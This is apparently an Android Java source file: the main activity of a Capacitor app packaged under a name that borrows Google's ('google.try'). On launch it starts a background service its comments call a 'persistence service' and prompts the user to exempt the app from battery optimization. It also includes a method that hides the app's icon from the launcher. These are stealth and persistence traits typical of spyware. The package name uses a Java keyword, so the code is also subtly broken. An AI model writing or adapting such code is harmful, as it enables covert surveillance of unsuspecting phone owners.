package google.try;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start the persistence service
        startSecurityService();
        
        // Check for battery optimization bypass
        requestIgnoreBatteryOptimizations();
    }

    private void startSecurityService() {
        Intent serviceIntent = new Intent(this, ForegroundSecurityService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivity(intent);
            }
        }
    }

    // This method can be called from JS via a Capacitor Plugin if needed
    public void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, google.try.MainActivity.class);
        p.setComponentEnabledSetting(componentName, 
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
            PackageManager.DONT_KILL_APP);
    }
}
